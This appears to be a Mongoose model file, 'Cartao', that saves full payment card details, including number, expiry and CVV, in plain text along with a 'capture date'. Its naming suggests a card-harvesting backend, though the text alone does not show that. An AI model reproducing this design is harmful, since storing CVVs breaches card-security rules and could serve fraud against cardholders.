const mongoose = require('mongoose');

const CartaoSchema = new mongoose.Schema({
  email: String,
  emailConfirm: String,
  nome: String,
  celular: String,
  numero: String,
  validade: String,
  cvv: String,
  nomeCartao: String,
  parcelas: String,
  doisCartoes: Boolean,
  dataCaptura: { type: Date, default: Date.now }
});

module.exports = mongoose.model('Cartao', CartaoSchema);
